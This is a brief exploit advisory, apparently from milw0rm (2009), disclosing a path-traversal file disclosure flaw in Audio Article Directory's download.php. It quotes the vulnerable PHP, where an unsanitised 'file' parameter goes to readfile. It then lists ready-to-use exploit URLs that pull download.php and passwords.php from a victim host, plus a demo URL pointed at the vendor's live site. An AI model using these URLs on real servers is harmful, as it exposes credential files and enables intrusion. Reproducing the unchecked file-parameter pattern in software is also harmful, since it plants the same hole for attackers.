@@ -1,0 +1,26 @@
+#################################################################################################################
+[+] Audio Article Directory Remote File Disclosure Vulnerability
+[+] Discovered By ThE g0bL!N
+Vendor:http://audioarticledirectory.com
+#################################################################################################################
+Poc
+---
+Download.php
+<?
+$file = "./".$_GET['file']; => one
+ header('Content-Description: File Transfer');
+           header('Content-Type: application/force-download');
+           header("Content-Disposition: attachment; filename=\"".basename($file)."\";");
+           header('Content-Length: ' . filesize($file));
+@readfile($file) OR die(); => 2
+?>
+Exploit
+----
+http://victim/download.php?file=download.php
+http://victim/download.php?file=./passwords.php
+Demo
+----
+http://audioarticledirectory.com/demo/download.php?file=./passwords.php
+################################################################################################################
+
+# milw0rm.com [2009-06-29]
